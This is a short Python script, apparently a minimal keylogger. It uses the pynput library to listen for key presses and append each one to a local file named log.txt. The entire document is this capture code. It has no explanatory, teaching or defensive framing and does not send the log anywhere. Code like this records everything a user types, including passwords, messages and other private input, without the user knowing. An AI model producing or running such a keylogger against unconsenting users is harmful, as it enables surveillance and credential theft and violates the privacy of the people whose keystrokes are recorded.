from pynput.keyboard import Listener

def log(keystroke):
    keystroke = str(keystroke).replace("'", "")

    with open("log.txt", 'a+') as f:
        f.write(keystroke)

with Listener(press=log) as x:
    x.join()